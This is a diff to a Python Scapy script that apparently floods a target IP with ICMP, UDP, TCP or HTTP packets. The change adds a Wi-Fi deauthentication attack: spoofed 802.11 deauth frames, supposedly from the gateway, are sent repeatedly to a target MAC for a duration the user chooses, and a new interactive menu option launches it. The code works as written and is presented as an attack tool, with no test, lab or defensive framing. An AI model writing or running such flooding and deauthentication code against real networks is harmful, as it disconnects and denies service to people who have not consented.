@@ -1,4 +1,5 @@
-from scapy.all import IP,ICMP,send,TCP,UDP,Raw
+from scapy.all import IP,ICMP,send,TCP,UDP,Raw,sendp,Dot11,RadioTap,Dot11Deauth 
+import sys
 import time as t
 
 def icmp_dump(ip,duration):
@@ -39,6 +40,19 @@ def http_dump(ip,duration,port):
         send(packet, verbose=False)
     print("Packets Sent!")
 
+def deauth(target_mac, gateway_mac, interface,duration):
+    # Create deauthentication packet
+    start_time = t.time() 
+    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
+
+    # Send deauth packet continuously
+    print(f"Sending deauth packets to {target_mac} from {gateway_mac}")
+    try:
+        while t.time() - start_time <  duration :
+            sendp(packet, iface=interface, count=100, inter=0.1, verbose=0)
+    except KeyboardInterrupt:
+        print("Attack stopped.")
+
 
 target_ip = input("Enter the target ip: ")
 
@@ -53,6 +67,13 @@ if target_ip.count('.') == 3:
     elif choice == 3:
         port = int(input("Enter the port no: "))
         udp_dump(target_ip,dump_time,port)
+    elif choice == 4:
+        tar_mac = input("Enter the target MAC: ")
+        gate_mac = input("Enter the gateway MAC: ")
+        intf = input("Interface: ")
+        duration = int(input("Enter time in seconds: "))
+        deauth(tar_mac,gate_mac,intf,duration)
+
     else:
         port = int(input("Enter the port no: "))
         http_dump(target_ip,dump_time,port)
